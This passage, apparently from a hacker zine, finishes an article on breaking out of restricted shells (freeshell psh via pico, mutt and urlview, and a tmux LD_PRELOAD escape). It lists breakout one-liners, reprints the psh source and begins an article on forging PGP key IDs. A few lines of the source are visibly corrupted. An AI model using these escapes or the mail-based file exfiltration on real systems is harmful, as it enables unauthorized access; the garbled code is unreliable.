+read any file, giving us our read primitive. The current source code for
+the psh shell is included in the appendix for you to learn from. In order
+to read arbitrary files from pico, we simply press the ctrl+r (^R) key
+combination and type a file-name. 
+
+From within this pico execution we are also able to save files using the
+ctrl+o hotkey (^O). This provides us an arbitrary write primitive, which
+will come in useful for us later.
+
+In the freeshell case, from within this environment we actually have the
+ability to send email. This provides an easy way for us to exfiltrate
+files. This can be done by reading a file (such as psh) into our pico
+session, then mailing it to a mailinator address for extraction.
+
+Now that we have read/write primitives, we need to leverage them to gain
+an execution primitive. After much investigation, the way that i ended up
+doing this was to abuse the urlview feature of mutt.
+
+Mutt offers the ability to select a email message and hit the ctrl+b (^B)
+hotkey in order to display a list of url's within the email message. The
+line in the config file which enables this is shown below.
+
+^B       M |urlview\n      call urlview to extract URLs out of a
+                           message    
+
+As you can see, the email message is simply piped to the urlview
+application. The description of this application from the manual page
+describes urlview as:
+
+       urlview  is  a  screen  oriented  program for extracting URLs from
+       text files and displaying a menu from which you may launch a
+       command to view a specific item.
+
+From the man page we can see that urlview is driven from a configuration
+file, either a system wide one "/etc/urlview.conf" or a local user copy 
+"~/.urlview". This configuration file is worth investigation with our write
+primitive to see what is available.
+
+Again from the configuration file, we can see that the COMMAND option fits
+our need. It's description is shown below.
+
+COMMAND command
+If the specified command contains a %s, it will be subsituted with the
+URL that was requested, otherwise the URL is appended to the COMMAND
+string. The default COMMAND is:
+
+    url_handler.sh %s 
+
+As you can see, all that's needed it to create a configuration file with
+the following contents:
+
+    COMMAND /usr/pkg/bin/bash # %s
+
+This will cause urlview to append the url to the above line, and execute
+it. Since a # is used prior to the %s the url will be treated as a
+comment. This results in an unrestricted bash shell being executed when we
+select an email message, press v followed by ctrl+b.
+
+Once again this technique has been fixed, I will leave it as an exercise
+for the reader to find a new one. Hopefully freeshell is not angry about
+this since it is a learning exercise.
+
+--[ A real life example - Private shell box
+
+Recently a friend of mine set up a private ircd box for some semi-trusted
+people. He created a chrooted environment where a user could ssh into a
+box and be greeted with a tmux session containing a single window with the
+irssi client inside it. I was unable to create a new window, or execute any
+other commands. Irssi was heavily restricted using a configuration file,
+stopping easy wins like /exec from within the irssi client.
+
+After some trial and error, i settled into the tmux man page for
+inspiration. tmux supports a variety of commands which can be entered by
+pressing the tmux hotkey (ctrl+b) in this case and the : key. This provides
+a small shell in which you can enter commands to tmux.
+
+Reading the man-page, one of the first commands which stood out was as
+follows:
+
+ update-environment variables
+    Set a space-separated string containing a list of environment variables
+to be copied into the session environment when a new session is created or
+an existing session is attached. Any variables that do not exist in the
+source environment are set to be removed from the session environment (as
+if -r was given to the set-environment command). The default is "DISPLAY
+SSH_ASKPASS SSH_AUTH_SOCK SSH_AGENT_PID SSH_CONNECTION WINDOWID
+XAUTHORITY".
+
+To test this, i set the environment variable LD_PRELOAD to the value
+/tmp/wut.so. Then i logged out and into the box. This resulted in a
+segmentation faul upon connecting back as irssi tried to spawn, while
+loading a shared library which didn't exist. Great i'd found a bug, but
+unfortunately i'd locked myself out of the shell. Since this was a test, i
+could luckily ask my friend to restart my tmux session, however in a real
+case this would have been trouble. Now i had the ability to load a dynamic
+library of my choice, however without the ability to create one on disk, i
+was still not any better off. 
+
+After reading the tmux man page a little more, i came across the commands
+responsible for managing the paste buffers.
+
+Specifically, it is possible to load a paste buffer from a file using the
+command: 
+
+ load-buffer [-b buffer-name] path
+
+        (alias: loadb)
+
+    Load the contents of the specified paste buffer from path.
+
+With the paste buffer containing a file, you can then use:
+
+ show-buffer [-b buffer-name]
+
+        (alias: showb)
+
+    Display the contents of the specified buffer.
+
+This creates a new tmux window, containing the contents of the file you
+loaded. This gives us the read primitive.
+
+We can also use the command:
+
+ save-buffer [-a] [-b buffer-name] path
+
+        (alias: saveb)
+
+    Save the contents of the specified paste buffer to path. The -a option
+appends to rather than overwriting the file.
+
+As you can see, this command allows us to write our buffer out to a
+different file. To experiment with this, i copied a shared library that i
+knew existed by loading it into the buffer, then writing it out to /tmp.
+Then i set LD_PRELOAD, and validated that irssi did not crash.
+
+The final command needed to break out of this shell is:
+
+ set-buffer [-a] [-b buffer-name] [-n new-buffer-name] data
+
+        (alias: setb)
+
+    Set the contents of the specified buffer to data. The -a option appends
+to rather than overwriting the buffer. The -n option renames the buffer to
+new-buffer-name.
+
+As you can see, this lets us manipulate the paste buffer in a more fine
+grain manner, in order to create a .so that we can abuse to get controlled
+code execution.
+
+As you can see, the methodology at play here is very similar to the
+previous examples, but the actual technology at play was very different.
+
+--[ Attacking the transport 
+
+In some cases the restricted shell is just too restrictive, and it's just
+not possible to gain any of these primitives. In these cases there are
+still some things that are worth investigating. Sometimes you can attack
+the protocol with which you are connecting to the system. The first
+example, is the shellshock vulnerability (sorry to use a buzzword). 
+Systems which are vulnerable to shellshock can sometimes be exploited to
+execute bash commands prior to invoking the users shell. This obviously
+breaks out of the restrictive environment.
+
+Another example, is when the shell is dynamically linked. (Such as
+nologin typically). If the user is also given ftp access, or the ability to
+otherwise write to their home directory, sometimes the .ssh/ directory can
+be written to in order to create a config file, and if sshd is poorly
+configured, this can allow the user to provide a LD_PRELOAD environment
+variable to the ssh session, bypassing the nologin shell.
+
+--[ Conclusion
+
+As you can hopefully see, setting up a restricted shell in a secure manner
+is an almost impossible task. The nature of secure shells involves exposing
+an untrusted user to code which was not designed to be trusted. 
+
+While there was not too much as far as technical content in this paper,
+hopefully it has still provided you some entertainment, and some ideas you
+can use in the future. I definitely encourage you all to play with some
+restricted shells as, even if you do not need the functionality, they still
+provide a fun free wargame.
+
+Thanks go out to freeshell.org for your interesting wargame levels over the
+years, as well as huku for your help with this.
+
+--[ References
+
+1) Restricted shells - Wikipedia -
+   https://en.wikipedia.org/wiki/Restricted_shell
+2) http://www.freeshell.org
+3) http://www.defensecode.com/public/
+   DefenseCode_Unix_WildCards_Gone_Wild.txt
+
+--[ Appendix A - Common commands with useful primitives
+
+- vim :: Execution primitive
+    :set shell=/bin/bash 
+    :shell
+- arp -f <file> :: File read primitive
+- iptables --modprobe=<cmd> :: Execution primitive
+- tar --checkpoint-action=<cmd> :: Execution primitive
+- rsync -e <cmd> :: Execution primitive
+- scp -F <file> a b: :: File read primitive
+- scp -S <command> a b: :: Execution primitive
+- lynx 'e' :: File read/write in editor
+- lynx ! :: Execute Primitive
+- mail "~v" :: Execute primitive
+
+--[ Appendix B - psh Source code 
+
+#!/usr/pkg/bin/pdksh
+stty susp '' intr '' quit '' erase '^h'
+count=0
+ccount=0
+export TERM=xterm-color
+export SHELL=/dev/null
+export LESSSECURE=true
+export HISTORY=$HOME/.history
+export EDITOR=/usr/pkg/bin/pico
+export VISUAL=/usr/pkg/bin/pico
+export NNTPSERVER=VALIDATE.TO.ACCESS.USENET
+export MYTTY=`tty|cut -d/ -f3,4`
+export SMALLTTY=`echo $MYTTY|cut -c4-5`
+export MYIP=`echo $SSH_CLIENT|awk '{print $1}'`
+
+if [ -f ${HOME}/.profile ]
+then rm -f ${HOME}/.profile
+exit 0
+fi
+if [ -f ${HOME}/.kshrc ]
+then rm -f ${HOME}/.kshrc
+exit 0
+fi
+
+if [ "$MYIP" = "" ]
+then MYIP="x.x.x.x"
+fi
+if [ -f $HOME/.pshrc ]
+then BACKSPACE=`grep BACKSPACE $HOME/.pshrc|cut -d= -f2`
+if [ "$BACKSPACE" != "" ]
+then stty erase $BACKSPACE 1>/dev/null 2>/dev/null
+fi
+fi
+
+Validate(){
+echo
+echo "Validation is basically designed to protect us from spammers. There"
+echo "are ways you can get validated by an SDF member. For instance if you"
+echo "were a student and your professor taught a class here on SDF you"
+echo "could gain validation through that class."
+echo
+echo "If you were referred to SDF by a friend or a current SDF member,"
+echo "they may be able to validate your new account for you. You can"
+echo "usually find SDF egulars in either 'com' or 'irc'. Be sure to ask"
+echo "them to help you."
+echo
+echo "(continue)\c"
+read continue
+echo
+echo "Validating your account ensures our future! Please do it today."
+echo "Remember, you make SDF what it is. Without you, we wouldn't exist."
+echo
+echo " 1) Get a stamped envelope, a sheet of paper and ONE (1) US Dollar."
+echo " 2) Write '$LOGNAME' clearly in the upper left hand corner of the"
+echo "envelope."
+echo " 3) Fold the donation inside a piece of paper and place inside the"
+echo "envelope."
+echo " OPTIONAL: Send TWO (2) US Dollars & SASE for an SDF Bumper Sticker."
+echo
+echo " 4) Seal and mail to: SDF Public Access UNIX System"
+echo " Post Office Box 17355"
+echo " Seattle WA 98127 USA"
+echo
+echo "Alternatively you may 'validate' your account via PAYPAL by clicking"
+echo "on the"
+echo "'DONATE' button at the bottom of the http://sdf.org website. The"
+echo "paypal"
+echo "minimum is \$3. Please include 'Validate $LOGNAME' in the Payment"
+echo "For field."
+echo
+#echo "We also accept BitCoin for validation:"
+echo "17GQEeNNHYPmkdgzHmHXiyMaVfgrhPvGBQ"
+echo "We also accept BitCoin - Please type 'bitcoin' for details."
+echo
+echo "You may also credit the validation fee towards 'arpa' membership"
+echo "should"
+echo "you decide to join 'arpa' within 30 days of validating your account."
+echo
+echo "(continue)\c"
+read continue
+echo
+echo "To see what you get as a validated member, type 'user'"
+echo "For Lifetime ARPA membership to SDF via paypal, type 'arpa'"
+echo "To see a list of UNIX commands you can use *NOW*, type 'unix'"
+echo "To view user contributed tutorials, visit http://sdf.org/?tutorials"
+echo "US Military Personnel, please type 'mil'"
+echo
+}
+
+Menu(){
+
+echo "SDF psh Version 8 - *PREVALIDATED SHELL ACCOUNT*"
+echo
+echo " what - what can I use this account for?"
+echo " unix - a listing of UNIX commands available to you NOW"
+echo " how - information on increasing membership"
+echo " teach - using SDF in a classroom setting"
+echo " dialup - information about SDF dialup service"
+echo " arpa - about lifetime arpa membership"
+echo " bboard - sdf user message boards"
+echo " commode - chat with other users online"
+echo " ysm - chat on the ICQ network"
+echo " bsflite - chat on the AIM network"
+echo " msnre - chat on the MSN network"
+echo " ttytter - listen to Twitter tweets anonymously"
+echo " lynx - browse the WWW textually or access GOPHER"
+echo " bksp - set your BACKSPACE key"
+echo " faq - frequently asked questions"
+echo " software - display software programs installed on the system"
+echo " quote - get a real time stock quote"
+echo " games - a listing of available games"
+echo " thxmoo - connect to the THXMOO"
+echo " mud - connect to the SDFmud"
+#echo " delme - delete your free account"
+echo " validate - gain additional shell access (also try 'user' for"
+echo "details)"
+echo
+
+}
+
+Move(){
+echo "Basic movement in $1:"
+echo
+echo "j - down (or rotate)"
+echo "k - up (or rotate)"
+echo "h - left"
+echo "l - right"
+echo "q or Q to quit"
+echo
+echo "[RETURN]\c"
+read ret
+}
+
+case `uname -n` in
+ol) /usr/local/bin/maint
+kill -9 0 ;;
+mx) echo
+echo "mx is reserved for mail service only."
+echo "Please use 'tty.sdf.org' to connect to SDF."
+echo
+sleep 5
+kill -9 0 ;;
+sverige) echo
+echo "sverige is reserved for MetaARPA members only."
+echo "Please use 'tty.sdf.org' to connect to SDF."
+echo
+sleep 5
+kill -9 0 ;;
+vinland) echo
+echo "vinland is reserved for VHOST members only."
+echo "Please use 'tty.sdf.org' to connect to SDF."
+echo
+sleep 5
+kill -9 0 ;;
+esac
+
+/usr/pkg/bin/expire
+#echo "Would you like to VALIDATE your account now? (y/n) \c"
+#case `/usr/pkg/bin/getchar` in
+# 121|89) echo "YES"
+# Validate ; echo "[RETURN]\c";read return;;
+# *) echo "NO" ;;
+#esac
+echo
+echo "Please press your BACKSPACE key: \c"
+stty raw
+dd of=.$$ count=1 1>/dev/null 2>/dev/null
+stty -raw
+stty erase `head -1 .$$` 2>/dev/null
+rm -f .$$
+#echo
+#echo "Enable Colours: (y/n) \c"
+#case `/usr/pkg/bin/getchar` in
+# 89|121) COLOR=TRUE
+# touch -f $HOME/.color ;;
+# *) COLOR=FALSE ;;
+#esac
+clear
+echo
+echo "===================================================================="
+echo "SDF host uptime report for Seattle WA, Dallas TX (USA) and Germany"
+echo " Please use 'tty.sdf.org' for general access"
+echo "===================================================================="
+echo
+/usr/local/bin/ruptime -a
+echo "(continue)\c"
+read return
+/usr/pkg/games/pom
+/usr/pkg/bin/phoon
+echo "(continue)\c"
+read return
+/usr/pkg/bin/guestbook -l 50
+echo "\nType 'help' for Commands."
+echo "Type 'com' to chat with other users."
+echo "Type 'ttytter' to listen to Twitter Tweets anonymously."
+echo "Type 'mud' to play the SDFmud."
+case `url $LOGNAME` in
+*.*.*) echo "\nYour website is http://`url ${LOGNAME}|awk '{print $1}'`"
+echo "with files in $HOME/html\n" ;;
+*) echo "Type 'mkhomepg' to set up your personal website.\n"
+esac
+case `echo $RANDOM|cut -c1` in
+1|2|3|4|5) echo "Did you know you can become a permanent LIFETIME member"
+echo "of SDF"
+echo "by making a onetime donation of \$36? Type 'arpa' for more info!\n" \
+;;
+6|7|8|9) echo "Did you know you can validate your account and gain weekend"
+echo "IRC access"
+echo "by making a donation of \$1 to \$3? Type 'validate' for more"
+echo "info!\n" ;;
+esac
+/usr/pkg/bin/dues -p
+#Menu
+PROMPT="`uname -n`"
+while true
+do
+if [ ! -d $HOME ]
+then echo "You may have become an ARPA member."
+echo
+echo "The update is now taking place and may require 2 or 3 minutes to"
+echo "complete. You will now be logged out. When you reconnect, please"
+echo "use ssh to connect to 'tty.sdf.org' for load balancing."
+echo
+echo "[RETURN]\c"
+read return
+kill -9 0
+fi
+
+if [ -f $HOME/.mailcap ]
+then rm -f $HOME/.mailcap
+fi
+if [ "$COLOR" = "TRUE" ]
+OMPT
+
+thene echo "$PROMPT:`pwd`> \c"
+fi
+read command
+arg=`echo ${command}|awk '{print $2,$3,$4,$5,$6}'`
+
+#if [ "$ccount" -gt "6" ]
+#then echo "\nPlease 'validate' or join 'arpa' today."
+# echo "Your membership ensures our future!!\n"
+# ccount=0
+#else ccount=`expr $ccount + 1`
+#fi
+echo "[`date +"%d-%b-%y %H:%M:%S"` $MYIP $MYTTY $PROMPT] $PWD $command" \
+2>/dev/null >>$HISTORY
+case `echo $command|awk '{print $1}'|tr A-Z a-z` in
+tty) tty;;
+stty) stty;;
+lock) lock;;
+ulimit) ulimit;;
+uname*) uname `echo ${command}|awk '{print $2}'` ;;
+echo*) shift ${command}
+echo "${command}" ;;
+how) /usr/local/bin/how;;
+cal*) /usr/pkg/bin/cal `echo $command|awk '{print $2}'` ;;
+what) /usr/local/bin/newbie
+;;
+
+passwd*|chfn*|chsh*|maint) /usr/local/bin/passwd ;;
+url*) url=`echo $command|awk '{print $2}'`
+url $url;;
+gopher*) site=`echo $command|awk '{print $2}'`
+if [ "$site" = "" ]
+then lynx -anonymous -restrictions=all gopher://sdf.lonestar.org
+else lynx -anonymous -restrictions=all $site
+fi
+;;
+bksp*) bksp=`echo $command|awk '{print $2}'`
+if [ "$bksp" = "" ]
+then echo "\nTo set your backspace key, type 'bksp' then press your"
+echo "actual key and then press return.\n"
+else stty erase $bksp
+echo "BACKSPACE=$bksp" > $HOME/.pshrc
+fi;;
+
+bitcoin*) /usr/local/bin/bitcoin ;;
+sftp*|ftp*) echo "\nPlease 'validate' your account to FTP files to and"
+echo "from your SDF account.\n" ;;
+tar*|make|cc*|tf*|gcc*|g++*|perl*|python*|ruby*|*configure*|netstat*| \
+telnet*|ssh*|rlogin*|screen*|nmap*|wget*)
+echo "\nTo use this feature, please join the SDF 'arpa' membership"
+echo "ARPA membership is available to you for a one time donation of only"
+echo "\$36."
+echo
+echo "Your membership ensures our future! Type 'arpa' for details.\n"
+;;
+getdialup*) npa=`echo $command|awk '{print $2}'`
+/usr/local/bin/getdialup $npa ;;
+setdialup) echo "Please validate your account first. For now you can use"
+echo "'getdialup' to find access numbers in your area." ;;
+phlog|deskshots|sdfers) echo "Please validate your account first." ;;
+dialup) /usr/local/bin/dialup ;;
+games) /usr/local/bin/games ;;
+mud) /usr/pkg/bin/mud ;;
+war) /sys/sdf/bin/war ;;
+warsetup) /sys/sdf/bin/warsetup ;;
+thxmoo) /usr/pkg/bin/thxmoo ;;
+bj) /usr/pkg/games/bj;;
+lander) /usr/pkg/games/lander;;
+othello) /usr/pkg/games/othello;;
+advent) /usr/pkg/games/advent;;
+zork) /usr/pkg/games/advent;;
+tttt) /usr/pkg/games/tttt;;
+moon) /usr/pkg/bin/moon-buggy;;
+tetrinet) if [ "$LINES" -lt "50" ]
+then echo "% tetrinet requires your TTY to be at least 50 lines."
+sleep 2
+fi
+tetrinet $LOGNAME tetrinet.sdf.org
+;;
+tess) /usr/pkg/games/tess;;
+c4) /usr/pkg/games/c4;;
+ski) /usr/pkg/games/ski;;
+knight) /usr/pkg/games/knight;;
+suicide) /usr/pkg/games/suicide;;
+dinkum) /usr/pkg/games/dinkum;;
+aybabtu) /usr/local/bin/aybabtu;;
+barnacle) /usr/pkg/bin/barnacle;;
+invaders) /usr/pkg/games/invaders
+stty sane ;;
+life) /usr/pkg/bin/life /usr/pkg/share/life/tiny.life ;;
+order) echo "Please validate your account first.";;
+ysm) /usr/pkg/bin/ysm;;
+micq) /usr/pkg/bin/rmicq;;
+bsflite) /usr/pkg/bin/bsflite;;
+msnre) /usr/pkg/bin/msnre;;
+dopewars) dopewars;;
+zombies) Move $command
+/usr/pkg/bin/zombies;;
+snake) Move $command
+/usr/pkg/games/snake;;
+wanderer) Move $command
+/usr/pkg/games/wand;;
+worm) Move $command
+/usr/pkg/games/worm;;
+greed) Move $command
+/usr/pkg/games/greed;;
+tetris) Move $command
+/usr/pkg/games/tetris;;
+sokoban) Move $command
+/usr/pkg/games/sokoban;;
+robots) Move $command
+/usr/pkg/games/robots;;
+torus) Move $command
+/usr/pkg/games/torus;;
+mazewar) /usr/local/bin/mazewar;;
+mdg) /usr/local/bin/mdg
+if [ "$?" != "0" ]
+then echo "\nMDG might not be running at the moment"
+echo "Please try again later."
+fi;;
+dict*) args=`echo $command|awk '{print $2}'`
+dict $args
+;;
+quote*) args=`echo $command|awk '{print $2}'`
+quote $args
+;;
+cal*) args=`echo $command|awk '{print $2}'`
+cal $args
+;;
+domains) /usr/local/bin/domains ;;
+unix) unix ;;
+linux) linux;;
+dig*) domain=`echo $command|awk '{print $2" "$3" "$4" "$5" "$6" "$7" "$8}'`
+dig $domain
+;;
+host*) domain=`echo $command|awk '{print $2" "$3" "$4" "$5" "$6" "$7" \
+"$8}'`
+host $domain
+;;
+geoip*) domain=`echo $command|awk '{print $2}'`
+geoip $domain
+;;
+whois*) domain=`echo $command|awk '{print $2}'`
+jwhois $domain
+;;
+nslookup*) domain=`echo $command|awk '{print $2}'`
+nslookup $domain
+;;
+pkg_info) pkg_info 2>/dev/null|sort|more ;;
+lynx*restrict*) echo $command|mailx -s "$LOGNAME" smj;;
+lynx*) url=`echo $command|awk '{print $2}'`
+if [ "$url" = "" ]
+then lynx -anonymous -restrictions=all http://sdf.lonestar.org
+else case $url in
+http:*) ;;
+*) url="http://$url" ;;
+esac
+lynx -anonymous -restrictions=all $url
+fi
+;;
+
+edit*|vi*|pico*|emacs*) file=`echo $command|awk '{print $2}'`
+if [ "$file" = "" ]
+then echo "usage: edit {file}"
+else case $file in
+*../*|*.kshrc*|*.bashrc*|*.pshrc*|*.muttrc*|*.telnet*|*.mailcap*|*. \
+forward*|*.plan*|*.cfg*|*.history*) echo "usage: edit {file}";;
+*) /usr/pkg/bin/pico -t -b -o $HOME $PWD/$file ;;
+esac
+fi
+;;
+man*) man `echo $command|awk '{print $2}'`;;
+rm*) target=`echo $command|awk '{print $2}'`
+if [ "`echo $command|awk '{print $3}'`" != "" ] || [ "$target" = "" ]
+then echo "usage: rm {filename}"
+else case $target in
+*.history*|*psh*|*.hushlogin*) echo "Can't remove $target";;
+*) if [ -d $target ]
+then rm -rf $target
+else rm $target
+fi;;
+esac
+fi;;
+mv*) oldname=`echo $command|awk '{print $2}'`
+newname=`echo $command|awk '{print $3}'`
+if [ "`echo $command|awk '{print $4}'`" != "" ] || [ "$oldname" = "" ] || \
+ [ "$newname" = "" ]
+then echo "usage: mv {oldfile} {newfile}"
+else case $oldname$newname in
+*.muttc*|*.kshrc*|*.mailcap*|*.telnet*|*.plan*|*html*|*.forward*|*. \
+history*|*psh*|*.hushlogin*|*.cfg*) echo "Cant move $oldname to $newname";;
+*) mv $oldname $newname ;;
+esac
+fi;;
+ping*) /sbin/ping -c5 `echo $command|awk '{print $2}'`;;
+teach) cat ~ftp/pub/sdf/faq/TEACH/01;;
+traceroute*) traceroute `echo $command|awk '{print $2}'` & ;;
+games) games;;
+disk) disk;;
+df*) df `echo $command|awk '{print $2}'` ;;
+oneliner) /usr/pkg/bin/oneliner;;
+rogue) /usr/pkg/games/rogue ;;
+hack) /usr/pkg/games/hack ;;
+nethack) /usr/pkg/bin/nethack ;;
+hunt*) echo
+echo "hunt commands:"
+echo
+echo "j - down"
+echo "k - up"
+echo "h - right"
+echo "l - right"
+echo "1 - gun"
+echo "2 - grenade"
+echo "3 - bomb"
+echo "q - quit"
+echo
+echo "the shift key plus j,k,h or l changes direction"
+echo
+/usr/pkg/games/hunt `echo $command|awk '{print $2}'`;;
+upload) echo "press CTRL-X several times to abort."
+lrz -y;;
+mkdir) directory=`echo $command|awk '{print $2}'`
+case $directory in
+*html*|*.plan*) echo "usage: mkdir {name}";;
+*) mkdir $directory;;
+esac;;
+#mkhomepg*|mkhome*) mkhomepg `echo $command|awk '{print $2}'`;;
+mkhomepg*|mkhome*) echo "mkhomepg has been temporarily disabled for"
+echo "prevalidated users." ;;
+
+vhost) echo
+echo " As a lifetime ARPA member, you can increase your membership level"
+echo " so that you may virtually host your own domain name on SDF. This"
+echo " includes DNS, mail service and virtual webhosting. For more info"
+echo " check out the FAQ: file"
+echo ;;
+help) Menu;;
+profiles) /usr/pkg/bin/profiles ;;
+#freeirc) echo "% 'freeirc' is available to ALL validated users from"
+echo "Friday 23:59:59"
+# echo " through Monday 00:00:01 UTC. Please 'validate' your account"
+# echo "today!" ;;
+user) echo "\nValidated users (\$1.00 or more) have immediate access to:\n"
+echo " 200mb total (home, web, mail & gopher)"
+echo " incoming file transfers via ftp or sftp"
+echo " elm, pine, mutt, mailx, rmail, pop3, gopher"
+echo " bash, ash, ksh, tcsh, rc, zsh, tclsh"
+echo " your URL http://$LOGNAME.freeshell.org"
+echo " limited cgi execution (shell scripts)"
+echo " icq, aim, talk, commode, bboard"
+echo " dialup ppp/shell access in the US and Canada"
+echo " USENET and ClariNET read/post access"
+echo " freeirc on Saturdays and Sundays"
+echo " hundreds of UNIX utilities"
+echo
+echo "The purpose of the prevalidated account is to help newusers"
+echo "learn about the UNIX system. Type 'unix' to see what UNIX"
+echo "commands are available to you right now. You can validate"
+echo "your account today! type 'validate' to validate\n";;
+env) env;;
+set) set;;
+#delme) delme;;
+bboard) /usr/pkg/bin/bboard;;
+eggdrop*) echo "% eggdrop is available to MetaARPA members only" ;;
+psybnc*) echo "% psybnc is available to MetaARPA members only" ;;
+arpa|join|member) arpa;;
+auction) auction;;
+cat*|more*|less*) file=`echo $command|awk '{print $2}'`
+case $file in
+*psh*) file="" ;;
+*random*|*null*|*zero*) echo "% Ja tvoi sluga ja tvoi rabotnik";file="" ;;
+esac
+if [ "$file" = "" ]
+then echo "usage: cat {filename}"
+else if [ "`wc -l $file|awk '{print $1}'`" -ge "500" ]
+then tail -500 $file
+else cat $file
+fi
+fi;;
+software*) /usr/local/bin/software `echo $command|awk '{print $2}'` ;;
+cd*) cd `echo $command|awk '{print $2}'`;;
+finger*) user=`echo $command|awk '{print $2}'`
+case ${user} in
+*-*) user=root ;;
+esac
+size=`ruptime -a|awk 'END {print $1}'`
+if [ "$user" = "" ]
+then echo "You are on `uname -n` among $size users. ('validate' to see"
+echo "usernames)"
+else finger -m $user
+fi ;;
+date) date ;;
+whereis*) whereis `echo $command|awk '{print $2}'`;;
+locate*) locate `echo $command|awk '{print $2}'` ;;
+whoami*) /usr/bin/whoami ;;
+who|w|ps*|last*)
+size=`ruptime -a|awk 'END {print $1}'`
+echo "You are on `uname -n` among $size users. ('validate' to see"
+echo "usernames)" ;;
+uptime|ruptime*) ruptime -a;;
+chmod*) chmod `echo $command|awk '{print $2" "$3}'` ;;
+ls*|ll*|dir*) if [ "$COLOR" = "TRUE" ]
+then /usr/pkg/bin/colorls -a `echo $command|awk '{print $2}'|tr R r`
+else ls -a `echo $command|awk '{print $2}'|tr R r`
+fi ;;
+sl*) /usr/pkg/bin/sl ;;
+pwd) pwd;;
+msg) msg ;;
+# ps*) ps `echo $command|awk '{print $2}'` ;;
+validate) Validate ;;
+mil) /usr/local/bin/mil ;;
+why) echo
+echo "It didn't used to be this way .. but you must understand that your"
+echo "small token of trust builds a better SDF for all of us:"
+echo
+echo "Due to the increased number of security and spam attacks, we are now"
+echo "asking that you send ONE US Dollar (or 5 EURO note) as a token of"
+echo "your sincerity in becoming a longterm member of our community. It is"
+echo "unfortunate that the net has become filled with people whose daily"
+echo "goal in life is to terriorize others online. We believe that asking"
+echo "for ONE US Dollar would not present a burden"
+echo "to anyone in the world. We hope to keep SDF a safe and secure haven"
+echo "for you and other shell users. To get an SDF bumper sticker, send in"
+echo "TWO US Dollars and a SASE (Self-Addressed Stamped Envelope). Please"
+echo "include your username."
+echo
+echo " SDF public access UNIX system"
+echo " Post Office Box 17355"
+echo " Seattle WA 98127 USA"
+echo;;
+w*) size=`ruptime -a|awk 'END {print $1}'`
+echo "You are on `uname -n` among $size users. ('validate' to see"
+echo "usernames)" ;;
+
+alpine*|pine*|mail*|mutt*|elm*) case `echo $command|awk '{print $2}'` in
+-*) echo "unknown mail flag." ;;
+*) mutt -F /sys/pkg/etc/rmuttrc ;;
+esac;;
+*irc*|bitchx*|irssi*|epic*|freeirc*)
+#tetrinet $LOGNAME tetrinet.sdf.org ;;
+echo "-=- Basic IRC Commands -=-"
+echo
+echo "/list - List channels"
+echo "/join #channel - Join a channel"
+echo "/list #channel - Leave a channel"
+echo "/msg nick msg - Send a private message"
+echo "/who - Who is on"
+echo "/quit - Quit IRC"
+echo
+echo "-(continue)-\c"
+read ret
+/usr/pkg/bin/oirc -p 7000 ${LOGNAME} irc.sdf.org
+#/usr/pkg/bin/oirc -p 6667 ${LOGNAME} irc.sdf.org
+echo ;;
+
+com|chat|commode) \
+room=`/usr/pkg/bin/comwho|head -3|tail -1|awk '{print $1}'`
+echo "ROOMNAME=$room" > $HOME/.comrc
+/usr/pkg/bin/com ;;
+pcom|pcommode) room=`/usr/pkg/bin/pcomwho|head -3|tail -1|awk '{print $1}'`
+echo "ROOMNAME=$room" > $HOME/.comrc
+/usr/pkg/bin/pcom ;;
+ttytter*|twitter*) echo "% Twitter username (or [RETURN] for anonymous):\c"
+read tweet
+if [ "$tweet" = "" ]
+then echo "% Logging in anonymously"
+/usr/local/bin/ttytter -anonymous
+else /usr/local/bin/ttytter -user=$tweet
+fi ;;
+w2k) /usr/local/bin/w2k ;;
+mkgopher) mkgopher;;
+faq) faq;;
+clear) clear;;
+usenet|trn*|tin*|slrn*|nn*|rn*) echo "% USENET is available to validated"
+echo "users." ;;
+die) echo "you has failed."
+sleep 4
+exit 0 ;;
+logout|leave|bye|quit|exit|escape|terminate|cease|logoff|end)
+clear
+#echo "Would you like to remove your account from our system? (y/n) \c"
+#read ans
+# case $ans in
+# y*|Y*) delme ;;
+# *) echo "% '$LOGNAME' will not be deleted." ;;
+# esac
+echo "Good Bye from the S D F - 1 .."
+echo
+echo "Please 'validate' or join 'arpa' soon."
+echo "Your support is appreciated!"
+echo
+echo "Thank you!"
+sleep 8
+exit 0;;
+uinfo|expire) uinfo;expire ;;
+dues) /usr/pkg/bin/dues ${arg} ;;
+#helpdesk) /usr/pkg/bin/helpdesk ;;
+guestbook) /usr/pkg/bin/guestbook ;;
+id*) /usr/bin/id ${arg} ;;
+nospam) echo "You must be validated to use this feature."
+;;
+*) if [ "$command" != "" ]
+then echo "psh: $command: not found - try 'help' for commands"
+else if [ "$count" -gt "20" ]
+then exit 0
+else count=`expr $count + 1`
+fi
+fi;;
+esac
+doneecho "
+
+
+|=[ 0x04 ]=---=[ Personalized PGP Key IDs - f1los0tt1l3 ]=---------------=|
+
+
+|=-----------------------------------------------------------------------=|
+|=-----------=[ Personalized PGP Key IDs for fun and profit ]=-----------=|
+|=-----------------------------------------------------------------------=|
+|=---------------------------=[ f1los0tt1l3 ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+---[ Contents
+
+  1 - Introduction
+   1.1 - Prior work
+  2 - The spec
+  3 - The attack
+   3.1 - Preparation
+   3.2 - The crash
+    3.2.1 - Runtime stats
+   3.3 - The patch
+  4 - Conclusion
+  5 - References
+  6 - Code
+
+---[ 1 - Introduction
+
+Everybody should be allowed to have his (or someone's) own PGP key ID. Who
+doesn't want his PGP key to match his favorite hex nickname or his
+target's key for some cheap social engineering? I certainly want, so I
+started researching how they are derived and if they could be bruteforced.
+
+Note: when we speak about key IDs here we mean the 4-byte short ones that
+everybody love to use. However, given enough processing power (or maybe a
+SHA1 ASIC|preimage attack) the process can obviously scale to any key ID
+length.
+
+-----[ 1.1 - Prior work
+
+GIYF, right? Well, a couple people tried this and lived to tell the tale
+(or, well, decided to make it public) but none of them permitted me to get
+a 4096 bit RSA key as I wanted it.
+
+In May 2010, halfdog posted on full-disclosure [1] some Java code that
+worked on DSA keys. Not exactly fast or customizable, but hey, it was 3
+years ago.
+
+Then, in Dec 2011, Asheesh, a Debian dev particularly fond of his key ID,
+found a way to create a new RSA 4096 key with that ID (and a bug in GnuPG
+handling of duplicate keys) [2]. He highlighted the disruptive potential
+of that and decided not to release the code. Bummer.
+
+But the keyservers carry even older evidence (even if one shouldn't trust
+the key creation field, especially on these keys): the first example of
+custom IDs I could find is
+
+    pub  1024R/A69AB99CDEADBEEF 1995-09-28
+
+that actually employs a old packet type.
+
+So we are not doing anything truly new, but there's still not a public
+method to get an arbitrary key with an arbitrary key ID.
+
